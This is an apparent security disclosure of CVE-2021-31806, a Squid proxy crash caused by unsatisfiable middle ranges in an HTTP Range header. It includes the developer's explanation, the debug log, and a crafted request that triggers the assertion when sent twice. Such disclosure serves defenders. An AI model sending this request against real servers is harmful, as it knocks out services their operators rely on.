# Unsatisfiable Range Requests Assertion
The HTTP request header 'Range' is used when a client wishes to partially download (also known as *byte serving*) a file from a compliant HTTP server (RFC 7233 states that Range header handling is optional in HTTP/1.1). Examples for usage include resuming downloads, segmented updates, and video playback (being able to skip to the middle of a video without downloading the whole video first).

Squid is able to handle both multi-part ranges (such as, bytes 0-50 AND 100-150), and single part ranges (bytes 0-50 ONLY), and their subsequent '206 Partial Content' responses.

## The Issue
A client may request multiple ranges from the server, such as, for example, ``Range: bytes=0-5,10-15,20-30``. However, if a client requests an unsatisfiable *middle* range, Squid will crash with an assertion. The exact reason for this assertion is difficult to communicate, and thus I offer an explanation from one of Squid's developers:

```
The range_iter.pos vector iterator was set before range specs were
finalized after learning the response content length (see
HttpHdrRange::canonize()). The finalization process clears the specs
vector, silently invalidating the iterator. Often the invalidated
iterator would still (accidentally) work, keeping the bug hidden, but
Range specs with at least one impossible-to-satisfy range (e.g., a
suffix range that starts beyond the actual response end) can "really"
invalidate that iterator, leading to assertions and use-after-free.
```

The following request will cause an assertion:
```
GET http://mt-test.op-test.net/1.jpgHTTP/1.0\n\r0\r\nRange:bytes=0-0,-0,-1\n\n
```
and will need to be sent twice:
```
2021/04/19 02:25:24.187| 64,3| HttpHdrRange.cc(569) debt: HttpHdrRangeIter::debt: debt is 1
2021/04/19 02:25:24.187| 33,3| Stream.cc(159) getNextRangeOffset: clientPackMoreRanges: in:  offset: 51912
2021/04/19 02:25:24.187| 64,3| HttpHdrRange.cc(569) debt: HttpHdrRangeIter::debt: debt is 1
2021/04/19 02:25:24.187| 33,3| Stream.cc(167) getNextRangeOffset: clientPackMoreRanges: out: start: 51911 spec[2]: [51911, 51912), len: 1 debt: 1
2021/04/19 02:25:24.187| assertion failed: Stream.cc:169: "http->out.offset <= start"
current master transaction: master53
```

This bug was assigned [CVE-2021-31806](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31806)
